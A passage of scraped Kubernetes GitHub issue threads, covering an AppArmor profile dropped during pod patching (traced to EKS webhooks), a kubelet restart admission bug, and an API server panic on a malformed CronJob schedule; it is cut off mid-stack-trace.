[here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "rickypeng99", "body": "I suspect that this behavior has something to do the mechanism where we are syncing the deprecated annotation to the `appArmorProfile` field under `securityContext`, probably it's not doing this when we are doing patches?"}, {"author": "itzPranshul", "body": "I believe the problem comes from how patching works with the new `securityContext.appArmorProfile` field  introduced in recent Kubernetes versions. What seems to be happening in 1.32 is that,  pod still uses the old annotation form for AppArmor so when we run `kubectl patch` to change something else, Kubernetes rebuilds the Pod spec internally using the new `securityContext.appArmorProfile` field. There is no step to copy the AppArmor value from the old annotation into the new field before calculating the diff, resulting in the Pod's internal version appearing to have no AppArmor profile. The diff logic treats this as a request to remove it.  In short, the backwards-compatibility logic that maps annotations to  `securityContext.appArmorProfile` is missing in the patch conversion flow "}, {"author": "Goend", "body": "I can't reproduce it.\n```\nroot@proxy-pass:~# kubectl  get pod test-fake -o yaml\napiVersion: v1\nkind: Pod\nmetadata:\n  annotations:\n    container.apparmor.security.beta.kubernetes.io/nginx-fake: localhost/cri-containerd.apparmor.d\n  creationTimestamp: \"2025-08-08T11:52:37Z\"\n  labels:\n    xx: xx\n  name: test-fake\n  namespace: default\n  resourceVersion: \"8145\"\n  uid: 9ca1df6d-8d8f-4d41-8e0b-7dc17c2242b1\nspec:\n  containers:\n  - image: docker.io/library/nginx:latest\n    imagePullPolicy: IfNotPresent\n    name: nginx-fake\n    resources: {}\n    securityContext:\n      appArmorProfile:\n        localhostProfile: cri-containerd.apparmor.d\n        type: Localhost\n    terminationMessagePath: /dev/termination-log\n    terminationMessagePolicy: File\n    volumeMounts:\n    - mountPath: /var/run/secrets/kubernetes.io/serviceaccount\n      name: kube-api-access-cvvvw\n      readOnly: true\n  dnsPolicy: ClusterFirst\n  enableServiceLinks: true\n  nodeName: proxy-pass\n  preemptionPolicy: PreemptLowerPriority\n  priority: 0\n  restartPolicy: Always\n  schedulerName: default-scheduler\n  securityContext: {}\n  serviceAccount: default\n  serviceAccountName: default\n  terminationGracePeriodSeconds: 30\n  tolerations:\n  - effect: NoExecute\n    key: node.kubernetes.io/not-ready\n    operator: Exists\n    tolerationSeconds: 300\n  - effect: NoExecute\n    key: node.kubernetes.io/unreachable\n    operator: Exists\n    tolerationSeconds: 300\n  volumes:\n  - name: kube-api-access-cvvvw\n    projected:\n      defaultMode: 420\n      sources:\n      - serviceAccountToken:\n          expirationSeconds: 3607\n          path: token\n      - configMap:\n          items:\n          - key: ca.crt\n            path: ca.crt\n          name: kube-root-ca.crt\n      - downwardAPI:\n          items:\n          - fieldRef:\n              apiVersion: v1\n              fieldPath: metadata.namespace\n            path: namespace\n```\npatch a existed key\n```\nroot@proxy-pass:~# ./kubectl patch pod test-fake -p '[{\"op\": \"remove\", \"path\": \"/metadata/labels\"}]' --type=json \npod/test-fake patched\n\n```\npatch a non existed key again\n```\nroot@proxy-pass:~# ./kubectl patch pod test-fake -p '[{\"op\": \"remove\", \"path\": \"/metadata/labels\"}]' --type=json \nThe request is invalid: the server rejected our request due to an error in our request\n```\n\nif you remove annotation,you will get\n```\nroot@proxy-pass:~# ./kubectl patch pod test-fake -p '[{\"op\": \"remove\", \"path\": \"/metadata/annotations\"}]' --type=json \nThe Pod \"test-fake\" is invalid: metadata.annotations[container.apparmor.security.beta.kubernetes.io/nginx-fake]: Forbidden: may not remove or update AppArmor annotations\n```\n\n\n```\nroot@proxy-pass:~# ./kubectl version\nClient Version: v1.33.2\nKustomize Version: v5.6.0\nServer Version: v1.32.5\n\n```\n\nthe pod which \"If we have a pod that is still using the annotation based app armor profile (without the appArmorProfile field under securityContext),\"  how to create?"}, {"author": "rickypeng99", "body": "> I can't reproduce it.\n> ```\n> root@proxy-pass:~# kubectl  get pod test-fake -o yaml\n> apiVersion: v1\n> kind: Pod\n> metadata:\n>   annotations:\n>     container.apparmor.security.beta.kubernetes.io/nginx-fake: localhost/cri-containerd.apparmor.d\n>   creationTimestamp: \"2025-08-08T11:52:37Z\"\n>   labels:\n>     xx: xx\n>   name: test-fake\n>   namespace: default\n>   resourceVersion: \"8145\"\n>   uid: 9ca1df6d-8d8f-4d41-8e0b-7dc17c2242b1\n> spec:\n>   containers:\n>   - image: docker.io/library/nginx:latest\n>     imagePullPolicy: IfNotPresent\n>     name: nginx-fake\n>     resources: {}\n>     securityContext:\n>       appArmorProfile:\n>         localhostProfile: cri-containerd.apparmor.d\n>         type: Localhost\n>     terminationMessagePath: /dev/termination-log\n>     terminationMessagePolicy: File\n>     volumeMounts:\n>     - mountPath: /var/run/secrets/kubernetes.io/serviceaccount\n>       name: kube-api-access-cvvvw\n>       readOnly: true\n>   dnsPolicy: ClusterFirst\n>   enableServiceLinks: true\n>   nodeName: proxy-pass\n>   preemptionPolicy: PreemptLowerPriority\n>   priority: 0\n>   restartPolicy: Always\n>   schedulerName: default-scheduler\n>   securityContext: {}\n>   serviceAccount: default\n>   serviceAccountName: default\n>   terminationGracePeriodSeconds: 30\n>   tolerations:\n>   - effect: NoExecute\n>     key: node.kubernetes.io/not-ready\n>     operator: Exists\n>     tolerationSeconds: 300\n>   - effect: NoExecute\n>     key: node.kubernetes.io/unreachable\n>     operator: Exists\n>     tolerationSeconds: 300\n>   volumes:\n>   - name: kube-api-access-cvvvw\n>     projected:\n>       defaultMode: 420\n>       sources:\n>       - serviceAccountToken:\n>           expirationSeconds: 3607\n>           path: token\n>       - configMap:\n>           items:\n>           - key: ca.crt\n>             path: ca.crt\n>           name: kube-root-ca.crt\n>       - downwardAPI:\n>           items:\n>           - fieldRef:\n>               apiVersion: v1\n>               fieldPath: metadata.namespace\n>             path: namespace\n> ```\n> patch a existed key\n> ```\n> root@proxy-pass:~# ./kubectl patch pod test-fake -p '[{\"op\": \"remove\", \"path\": \"/metadata/labels\"}]' --type=json \n> pod/test-fake patched\n> \n> ```\n> patch a non existed key again\n> ```\n> root@proxy-pass:~# ./kubectl patch pod test-fake -p '[{\"op\": \"remove\", \"path\": \"/metadata/labels\"}]' --type=json \n> The request is invalid: the server rejected our request due to an error in our request\n> ```\n> \n> if you remove annotation,you will get\n> ```\n> root@proxy-pass:~# ./kubectl patch pod test-fake -p '[{\"op\": \"remove\", \"path\": \"/metadata/annotations\"}]' --type=json \n> The Pod \"test-fake\" is invalid: metadata.annotations[container.apparmor.security.beta.kubernetes.io/nginx-fake]: Forbidden: may not remove or update AppArmor annotations\n> ```\n> \n> \n> ```\n> root@proxy-pass:~# ./kubectl version\n> Client Version: v1.33.2\n> Kustomize Version: v5.6.0\n> Server Version: v1.32.5\n> \n> ```\n> \n> the pod which \"If we have a pod that is still using the annotation based app armor profile (without the appArmorProfile field under securityContext),\"  how to create?\n\nMy bad I should have made it clearer that to reproduce it, the pod should only have annotation to begin with (no appArmorProfile security context at the time). \n\nIf it helps to reproduce exactly what we have, you can create a replica set deployment with a pod template that only contains the annotation.\n\nContext is that we are upgrading our workloads in a 1.32 cluster where the workloads were still using the same template as what they have in a 1.29 cluster. So they only have the annotation."}, {"author": "rickypeng99", "body": "> I believe the problem comes from how patching works with the new `securityContext.appArmorProfile` field introduced in recent Kubernetes versions. What seems to be happening in 1.32 is that, pod still uses the old annotation form for AppArmor so when we run `kubectl patch` to change something else, Kubernetes rebuilds the Pod spec internally using the new `securityContext.appArmorProfile` field. There is no step to copy the AppArmor value from the old annotation into the new field before calculating the diff, resulting in the Pod's internal version appearing to have no AppArmor profile. The diff logic treats this as a request to remove it. In short, the backwards-compatibility logic that maps annotations to `securityContext.appArmorProfile` is missing in the patch conversion flow\n\nYes, I agree with that. Especially after looking at https://github.com/kubernetes/kubernetes/blob/master/pkg/registry/core/pod/strategy.go#L100"}, {"author": "itzPranshul", "body": "I think the fix could be as simple as updating `PrepareForUpdate` to call `applyAppArmorVersionSkew(ctx, newPod)`. This would mirror the behaviour in `PrepareForCreate` and ensure that for every patch/update, the Pod is normalised from the old annotation form before the diff is calculated. That should prevent the AppArmor profile from being unintentionally removed."}, {"author": "Goend", "body": "/assign"}, {"author": "Goend", "body": "I will try to reproduce this issue and submit a PR to fix it.\nI think this fix is good, but we need to reproduce the scenario and ensure the issue is resolved.\n\n> I think the fix could be as simple as updating `PrepareForUpdate` to call `applyAppArmorVersionSkew(ctx, newPod)`. This would mirror the behaviour in `PrepareForCreate` and ensure that for every patch/update, the Pod is normalised from the old annotation form before the diff is calculated. That should prevent the AppArmor profile from being unintentionally removed.\n\n"}, {"author": "Goend", "body": "Kubernetes old version\n```\nroot@proxy-pass:~# kubectl version\nClient Version: v1.29.15\nKustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3\nServer Version: v1.29.15\n```\npod yaml\n```\napiVersion: v1\nkind: Pod\nmetadata:\n  annotations:\n    container.apparmor.security.beta.kubernetes.io/nginx-fake: localhost/cri-containerd.apparmor.d\n  labels:\n    app: test\n    xx: xx\n  name: test-fake\n  namespace: default\nspec:\n  containers:\n  - image: docker.io/library/nginx:latest\n    imagePullPolicy: IfNotPresent\n    name: nginx-fake\n    resources: {}\n    terminationMessagePath: /dev/termination-log\n    terminationMessagePolicy: File\n  dnsPolicy: ClusterFirst\n  enableServiceLinks: true\n  nodeName: proxy-pass\n  preemptionPolicy: PreemptLowerPriority\n  priority: 0\n  restartPolicy: Always\n  schedulerName: default-scheduler\n  securityContext: {}\n  serviceAccount: default\n  serviceAccountName: default\n  terminationGracePeriodSeconds: 30\n\n\n```\n\nget pod with no appArmorProfile security context\n```\nroot@proxy-pass:~# kubectl  apply -f pod \npod/test-fake created\nroot@proxy-pass:~# kubectl  get pod\nNAME                        READY   STATUS    RESTARTS   AGE\ntest-fake                   1/1     Running   0          5s\nroot@proxy-pass:~# kubectl  get pod test-fake -o yaml\napiVersion: v1\nkind: Pod\nmetadata:\n  annotations:\n    container.apparmor.security.beta.kubernetes.io/nginx-fake: localhost/cri-containerd.apparmor.d\n    kubectl.kubernetes.io/last-applied-configuration: |\n      {\"apiVersion\":\"v1\",\"kind\":\"Pod\",\"metadata\":{\"annotations\":{\"container.apparmor.security.beta.kubernetes.io/nginx-fake\":\"localhost/cri-containerd.apparmor.d\"},\"labels\":{\"app\":\"test\",\"xx\":\"xx\"},\"name\":\"test-fake\",\"namespace\":\"default\"},\"spec\":{\"containers\":[{\"image\":\"docker.io/library/nginx:latest\",\"imagePullPolicy\":\"IfNotPresent\",\"name\":\"nginx-fake\",\"resources\":{},\"terminationMessagePath\":\"/dev/termination-log\",\"terminationMessagePolicy\":\"File\"}],\"dnsPolicy\":\"ClusterFirst\",\"enableServiceLinks\":true,\"nodeName\":\"proxy-pass\",\"preemptionPolicy\":\"PreemptLowerPriority\",\"priority\":0,\"restartPolicy\":\"Always\",\"schedulerName\":\"default-scheduler\",\"securityContext\":{},\"serviceAccount\":\"default\",\"serviceAccountName\":\"default\",\"terminationGracePeriodSeconds\":30}}\n  creationTimestamp: \"2025-08-12T05:40:12Z\"\n  labels:\n    app: test\n    xx: xx\n  name: test-fake\n  namespace: default\n  resourceVersion: \"9693\"\n  uid: 5612e477-77eb-4905-9485-4bc5ca8f78b2\nspec:\n  containers:\n  - image: docker.io/library/nginx:latest\n    imagePullPolicy: IfNotPresent\n    name: nginx-fake\n    resources: {}\n    terminationMessagePath: /dev/termination-log\n    terminationMessagePolicy: File\n    volumeMounts:\n    - mountPath: /var/run/secrets/kubernetes.io/serviceaccount\n      name: kube-api-access-89fqs\n      readOnly: true\n  dnsPolicy: ClusterFirst\n  enableServiceLinks: true\n  nodeName: proxy-pass\n  preemptionPolicy: PreemptLowerPriority\n  priority: 0\n  restartPolicy: Always\n  schedulerName: default-scheduler\n  securityContext: {}\n  serviceAccount: default\n  serviceAccountName: default\n  terminationGracePeriodSeconds: 30\n...\n```\n\nupgrade kube-apiserver to 1.32,then exec command\n```\nroot@proxy-pass:~# ./kubectl patch pod test-fake  -p '[{\"op\": \"remove\", \"path\": \"/metadata/labels/xx\"}]' --type=json\npod/test-fake patched\nroot@proxy-pass:~# ./kubectl  get pod test-fake -o yaml|grep labels -A 2\n...\n  labels:\n    app: test\n  name: test-fake\n\n```\nversion information\n```\nroot@proxy-pass:~# ./kubectl version\nClient Version: v1.33.2\nKustomize Version: v5.6.0\nServer Version: v1.32.5\n```\nI still cannot reproduce the issue. We need to identify the root cause or scenario leading to this problem to gather more information.\n@rickypeng99 \n\n\n\n"}, {"author": "rickypeng99", "body": "> Kubernetes old version\n> \n> ```\n> root@proxy-pass:~# kubectl version\n> Client Version: v1.29.15\n> Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3\n> Server Version: v1.29.15\n> ```\n> \n> pod yaml\n> \n> ```\n> apiVersion: v1\n> kind: Pod\n> metadata:\n>   annotations:\n>     container.apparmor.security.beta.kubernetes.io/nginx-fake: localhost/cri-containerd.apparmor.d\n>   labels:\n>     app: test\n>     xx: xx\n>   name: test-fake\n>   namespace: default\n> spec:\n>   containers:\n>   - image: docker.io/library/nginx:latest\n>     imagePullPolicy: IfNotPresent\n>     name: nginx-fake\n>     resources: {}\n>     terminationMessagePath: /dev/termination-log\n>     terminationMessagePolicy: File\n>   dnsPolicy: ClusterFirst\n>   enableServiceLinks: true\n>   nodeName: proxy-pass\n>   preemptionPolicy: PreemptLowerPriority\n>   priority: 0\n>   restartPolicy: Always\n>   schedulerName: default-scheduler\n>   securityContext: {}\n>   serviceAccount: default\n>   serviceAccountName: default\n>   terminationGracePeriodSeconds: 30\n> ```\n> \n> get pod with no appArmorProfile security context\n> \n> ```\n> root@proxy-pass:~# kubectl  apply -f pod \n> pod/test-fake created\n> root@proxy-pass:~# kubectl  get pod\n> NAME                        READY   STATUS    RESTARTS   AGE\n> test-fake                   1/1     Running   0          5s\n> root@proxy-pass:~# kubectl  get pod test-fake -o yaml\n> apiVersion: v1\n> kind: Pod\n> metadata:\n>   annotations:\n>     container.apparmor.security.beta.kubernetes.io/nginx-fake: localhost/cri-containerd.apparmor.d\n>     kubectl.kubernetes.io/last-applied-configuration: |\n>       {\"apiVersion\":\"v1\",\"kind\":\"Pod\",\"metadata\":{\"annotations\":{\"container.apparmor.security.beta.kubernetes.io/nginx-fake\":\"localhost/cri-containerd.apparmor.d\"},\"labels\":{\"app\":\"test\",\"xx\":\"xx\"},\"name\":\"test-fake\",\"namespace\":\"default\"},\"spec\":{\"containers\":[{\"image\":\"docker.io/library/nginx:latest\",\"imagePullPolicy\":\"IfNotPresent\",\"name\":\"nginx-fake\",\"resources\":{},\"terminationMessagePath\":\"/dev/termination-log\",\"terminationMessagePolicy\":\"File\"}],\"dnsPolicy\":\"ClusterFirst\",\"enableServiceLinks\":true,\"nodeName\":\"proxy-pass\",\"preemptionPolicy\":\"PreemptLowerPriority\",\"priority\":0,\"restartPolicy\":\"Always\",\"schedulerName\":\"default-scheduler\",\"securityContext\":{},\"serviceAccount\":\"default\",\"serviceAccountName\":\"default\",\"terminationGracePeriodSeconds\":30}}\n>   creationTimestamp: \"2025-08-12T05:40:12Z\"\n>   labels:\n>     app: test\n>     xx: xx\n>   name: test-fake\n>   namespace: default\n>   resourceVersion: \"9693\"\n>   uid: 5612e477-77eb-4905-9485-4bc5ca8f78b2\n> spec:\n>   containers:\n>   - image: docker.io/library/nginx:latest\n>     imagePullPolicy: IfNotPresent\n>     name: nginx-fake\n>     resources: {}\n>     terminationMessagePath: /dev/termination-log\n>     terminationMessagePolicy: File\n>     volumeMounts:\n>     - mountPath: /var/run/secrets/kubernetes.io/serviceaccount\n>       name: kube-api-access-89fqs\n>       readOnly: true\n>   dnsPolicy: ClusterFirst\n>   enableServiceLinks: true\n>   nodeName: proxy-pass\n>   preemptionPolicy: PreemptLowerPriority\n>   priority: 0\n>   restartPolicy: Always\n>   schedulerName: default-scheduler\n>   securityContext: {}\n>   serviceAccount: default\n>   serviceAccountName: default\n>   terminationGracePeriodSeconds: 30\n> ...\n> ```\n> \n> upgrade kube-apiserver to 1.32,then exec command\n> \n> ```\n> root@proxy-pass:~# ./kubectl patch pod test-fake  -p '[{\"op\": \"remove\", \"path\": \"/metadata/labels/xx\"}]' --type=json\n> pod/test-fake patched\n> root@proxy-pass:~# ./kubectl  get pod test-fake -o yaml|grep labels -A 2\n> ...\n>   labels:\n>     app: test\n>   name: test-fake\n> ```\n> \n> version information\n> \n> ```\n> root@proxy-pass:~# ./kubectl version\n> Client Version: v1.33.2\n> Kustomize Version: v5.6.0\n> Server Version: v1.32.5\n> ```\n> \n> I still cannot reproduce the issue. We need to identify the root cause or scenario leading to this problem to gather more information. [@rickypeng99](https://github.com/rickypeng99)\n\nThanks for taking a look. To completely align on everything, my pod was created by a `Deployment`. Not sure if this will bring any difference.\n\nSo something like\n```\ntemplate:\n    metadata:\n      annotations:\n        container.apparmor.security.beta.kubernetes.io/<container>: localhost/<profile_name>\n```\n\nI just tried to patch the pod again, but still receiving the same error as above.\n"}, {"author": "Goend", "body": "Are you patching the Pods under the Deployment, or the Deployment configuration itself? Additionally, did you only modify the Pod's labels?"}, {"author": "rickypeng99", "body": "I am patching the pod under the deployment. And yes the command that I used was a simple\n```\nkubectl patch pod <pod_name> -p '[{\"op\": \"remove\", \"path\": \"/metadata/labels/<label>\"}]' --type=json\n\n\n<omit other lines>\n-\u00a0                             AppArmorProfile: &core.AppArmorProfile{Type: \"Localhost\", LocalhostProfile: &\"<profile>\"},\n+\u00a0                             AppArmorProfile: nil,\n```\n\nDirectly patching the deployment template is fine\n```\nkubectl patch deployment <deployment> -p '[{\"op\": \"remove\", \"path\": \"/spec/template/metadata/labels/<label>\"}]' --type=json\nWarning: spec.template.metadata.annotations[container.apparmor.security.beta.kubernetes.io/<container>]: deprecated since v1.30; use the \"appArmorProfile\" field instead\ndeployment.apps/<deployment> patched\n```\nBut I can't add the appArmorProfile in using `patch`\n```\n\u279c  ~ kubectl patch deployment <deployment> \\\n  --type strategic \\\n  -p '{\n    \"spec\": {\n      \"template\": {\n        \"spec\": {\n          \"containers\": [{\n            \"name\": \"<container>\",\n            \"securityContext\": {\n              \"appArmorProfile\": {\n                \"type\": \"Localhost\",\n                \"localhostProfile\": \"<profile?\"\n              }\n            }\n          }]\n        }\n      }\n    }\n  }'\n\ndeployment.apps/<deployment> patched\n```\nHowever if I describe the deployment again, nothing was updated. I raised another issue for this: https://github.com/kubernetes/kubectl/issues/1764"}, {"author": "Goend", "body": "Could you fully display the complete YAML of both the Pod you patched and the Deployment configuration? additionally, could you provide a full demonstration of the patching process for a Pod under a Deployment, exactly as I did above? have any custom webhooks or other extension mechanisms been deployed in the cluster?"}, {"author": "rickypeng99", "body": "Thanks for the pointers, looks like by deleting an EKS addon that AWS provided (it will bring along a couple webhooks). The issue is then resolved. I will dive deeper into the underlying root cause, but thanks again for helping out.\n\nThe main reason why I was thinking of the problem of k8s itself, was due to the fact that I was upgrading our cluster versions."}, {"author": "Goend", "body": "So after the AWS-provided EKS plugin was removed, the patch pod operation could succeed, right?\nAs for kubernetes/kubectl#1764,  It seems a bit like a controller issue, and it might not be directly related to the CLI itself. I\u2019ll need to look into the code further."}, {"author": "rickypeng99", "body": "Yes, the patch pod operation is working now."}, {"author": "Goend", "body": "/unassign"}, {"author": "Goend", "body": "/close"}, {"author": "k8s-ci-robot", "body": "@Goend: You can't close an active issue/PR unless you authored it or you are a collaborator.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/133416#issuecomment-3187208188):\n\n>/close\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "pacoxu", "body": "/close\n"}, {"author": "k8s-ci-robot", "body": "@pacoxu: Closing this issue.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/133416#issuecomment-3392880952):\n\n>/close\n>\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 133451, "issue_url": "https://github.com/kubernetes/kubernetes/issues/133451", "issue_title": "When kubelet restarts, admission still rejects pods", "issue_author": "daimaxiaxie", "issue_body": "### What happened?\n\nWhen kubelet restarts, the previously running pod is rejected by admission. This https://github.com/kubernetes/kubernetes/pull/118635  fails to cover all scenarios.\n\n```bash\n`2025-07-31 16:58:54 - Pod|1000000-vp2qd - UnexpectedAdmissionError, Allocate failed due to no healthy devices present; cannot allocate unhealthy devices rdma/hca_shared, which is unexpected`\n```\n\n\nCause:\n\n\n```json\n\"containerStatuses\": [\n    {\n      \"name\": \"app\",\n      \"state\": {\n        \"running\": {\n          \"startedAt\": \"2025-07-30T04:12:07Z\"\n        }\n      },\n      \"lastState\": {\n        \"terminated\": {\n          \"exitCode\": 0,\n          \"reason\": \"Completed\",\n          \"startedAt\": \"2025-07-28T05:33:22Z\",\n          \"finishedAt\": \"2025-07-30T04:09:41Z\",\n          \"containerID\": \"containerd://491ae36456e71a83a6c39270e364e85306f583f959b386660262898086462374\"\n        }\n      },\n      \"ready\": true,\n      \"restartCount\": 2,\n      \"image\": \"docker.io/ai/goglang:v0.0.1\",\n      \"imageID\": \"docker.io/ai/goglang@sha256:be1692a1c0437b07c47a89417a33622b21a488f131520xxxxxxx\",\n      \"containerID\": \"containerd://f393bcca6c8028c74f8987165759a472b3085f4bdf26173eb3dbb4cbe1f6cc9d\",\n      \"started\": true\n    }\n```\n\nhttps://github.com/kubernetes/kubernetes/pull/118635 use `isContainerAlreadyRunning` to check running container. It queries the id from the `containerMap`.\n\n`containerMap` stores all containers on the nodes.(This includes exiting)\n\n`containerMap` is a map, and when looking up the ID, it may return the exited container ID, not meeting expectations.\n\n```shell\n# nvida/gpu\nI0731 16:58:54.195904  909172 manager.go:1100] \"container found in the initial set, assumed running\" podUID=\"58cf408f-5297-4209-96a0-f2c367392151\" containerName=\"app\" containerID=\"f393bcca6c8028c74f8987165759a472b3085f4bdf26173eb3dbb4cbe1f6cc9d\"\nI0731 16:58:54.195915 909172 manager.go:575] \"container detected running, nothing to do\" deviceNumber=0 resourceName=\"nvidia.com/gpu\" podUID=\"58cf408f-5297-4209-96a0-f2c367392151\" containerName=\"app\"\n# rdma\nI0731 16:58:54.195953  909172 manager.go:1095] \"container not present in the initial running set\" podUID=\"58cf408f-5297-4209-96a0-f2c367392151\" containerName=\"app\" containerID=\"491ae36456e71a83a6c39270e364e85306f583f959b386660262898086462374\"\nI0731 16:58:54.196046 909172 manager.go:580] \"Need devices to allocate for pod\" deviceNumber=0 resourceName=\"rdma/hca_shared\" podUID=\"58cf408f-5297-4209-96a0-f2c367392151\" containerName=\"app\"\n```\n\n\n\n\n\n\n### What did you expect to happen?\n\nKubelet restart, pod still running.\n\n### How can we reproduce it (as minimally and precisely as possible)?\n\n1. device plugin start slow\n2. pod restartCount > 0, previous containers remain on the node\n3. kubelet restart\n4. There is a probability of recurrence\n\n### Anything else we need to know?\n\n_No response_\n\n### Kubernetes version\n\n<details>\n\n```console\n$ kubectl version\nServer Version: v1.28.3\n```\n\n</details>\n\n\n### Cloud provider\n\n<details>\nnull\n</details>\n\n\n### OS version\n\n<details>\n\n```console\nOS Image:                   AlmaLinux 9.1\n```\n\n</details>\n\n\n### Install tools\n\n<details>\n\n</details>\n\n\n### Container runtime (CRI) and version (if applicable)\n\n<details>\nContainer Runtime Version:  containerd://1.6.20\n</details>\n\n\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\n\n<details>\nhttps://github.com/Mellanox/k8s-rdma-shared-dev-plugin\n</details>\n", "issue_labels": ["kind/bug", "needs-sig", "needs-triage"], "comments": [{"author": "k8s-ci-robot", "body": "There are no sig labels on this issue. Please add an appropriate label by using one of the following commands:\n- `/sig <group-name>`\n- `/wg <group-name>`\n- `/committee <group-name>`\n\nPlease see the [group list](https://git.k8s.io/community/sig-list.md) for a listing of the SIGs, working groups, and committees available.\n\n\n<details>\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "k8s-ci-robot", "body": "This issue is currently awaiting triage.\n\nIf a SIG or subproject determines this is a relevant issue, they will accept it by applying the `triage/accepted` label and provide further guidance.\n\nThe `triage/accepted` label can be added by org members by writing `/triage accepted` in a comment.\n\n\n<details>\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "ffromani", "body": "Hi, thanks for filing this issue. It seems a duplicate of https://github.com/kubernetes/kubernetes/issues/133382"}, {"author": "pacoxu", "body": "/close\nfor dup"}, {"author": "k8s-ci-robot", "body": "@pacoxu: Closing this issue.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/133451#issuecomment-3392863423):\n\n>/close\n>for dup\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 134320, "issue_url": "https://github.com/kubernetes/kubernetes/issues/134320", "issue_title": "API Server returns panic message to caller when Creating CronJob with Some Invalid Schedule Format", "issue_author": "PersistentJZH", "issue_body": "### What happened?\n\nAPI Server panics when creating a CronJob with an invalid schedule format like `\"TZ=0\"`. This causes a slice bounds out of range error in the robfig/cron parser.\n\n\n### What did you expect to happen?\n\nAPI Server should return a proper validation error instead of panic.\n\n\n### How can we reproduce it (as minimally and precisely as possible)?\n\n\n1. Create a CronJob YAML with invalid schedule:\n```yaml\napiVersion: batch/v1\nkind: CronJob\nmetadata:\n  name: daily-backup\nspec:\n  schedule: \"TZ=0\"  # Invalid: missing space and cron expression\n  jobTemplate:\n    spec:\n      template:\n        spec:\n          containers:\n          - name: backup\n            image: alpine\n            command: [\"/bin/sh\"]\n            args: [\"-c\", \"echo 'Starting backup...' && date\"]\n          restartPolicy: OnFailure\n```\n\n2. Apply the YAML:\n```bash\nkubectl apply -f test-cron-job.yaml\n```\n\n**Actual behavior:**\nThe API server panics with:\n```\nerror: error when creating \"test-cron-job.yaml\": Post \"https://127.0.0.1:56870/apis/batch/v1/namespaces/default/cronjobs?fieldManager=kubectl-client-side-apply&fieldValidation=Strict\": stream error: stream ID 7; INTERNAL_ERROR; received from peer\n```\n\n\n**Log:**\n```\nE0928 08:07:51.393094       1 timeout.go:121] \"Observed a panic\" panic=<\n\truntime error: slice bounds out of range [:-1]\n\tgoroutine 70144 [running]:\n\tk8s.io/apiserver/pkg/endpoints/handlers/finisher.finishRequest.func1.1()\n\t\tk8s.io/apiserver/pkg/endpoints/handlers/finisher/finisher.go:105 +0x98\n\tpanic({0x2907bc0?, 0x4009b9d110?})\n\t\truntime/panic.go:792 +0x124\n\tgithub.com/robfig/cron/v3.Parser.Parse({0x4011dd3701?}, {0x4011df4e30, 0x4})\n\t\tgithub.com/robfig/cron/v3@v3.0.1/parser.go:99 +0x5cc\n\tgithub.com/robfig/cron/v3.ParseStandard(...)\n\t\tgithub.com/robfig/cron/v3@v3.0.1/parser.go:230\n\tk8s.io/kubernetes/pkg/apis/batch/validation.validateScheduleFormat({0x4011df4e30, 0x4}, 0x0, 0x0, 0x400d0bf590)\n\t\tk8s.io/kubernetes/pkg/apis/batch/validation/validation.go:793 +0x48\n\tk8s.io/kubernetes/pkg/apis/batch/validation.validateCronJobSpec(0x400325a710, 0x0, 0x400d0bf560, {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, ...})\n\t\tk8s.io/kubernetes/pkg/apis/batch/validation/validation.go:750 +0x9ec\n\tk8s.io/kubernetes/pkg/apis/batch/validation.ValidateCronJobCreate(0x400325a608, {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x1, ...})\n\t\tk8s.io/kubernetes/pkg/apis/batch/validation/validation.go:718 +0xc4\n\tk8s.io/kubernetes/pkg/registry/batch/cronjob.cronJobStrategy.Validate({{0xf94b7cd42c38?, 0x2b6c3f2?}, {0x4011dd3a38?, 0x13e9944?}}, {0x4011dd3a38?, 0x13e98a4?}, {0x31c1360?, 0x400325a608})\n\t\tk8s.io/kubernetes/pkg/registry/batch/cronjob/strategy.go:115 +0x74\n\tk8s.io/apiserver/pkg/registry/rest.BeforeCreate({0x31f1768, 0x4002558ee0}, {0x31e0940, 0x400d07c9f0}, {0x31c1360, 0x400325a608})\n\t\tk8s.io/apiserver/pkg/registry/rest/create.go:122 +0x188\n\tk8s.io/apiserver/pkg/registry/generic/registry.(*Store).create(0x4000f28180, {0x31e0940, 0x400d07c9f0}, {0x31c1360, 0x400325a608}, 0x4011dcb140, 0x400335c4e0)\n\t\tk8s.io/apiserver/pkg/registry/generic/registry/store.go:501 +0x19c\n\tk8s.io/apiserver/pkg/registry/generic/registry.(*Store).Create(0x4000f28180, {0x31e0940, 0x400d07c9f0}, {0x31c1360, 0x400325a608}, 0x4011dcb140, 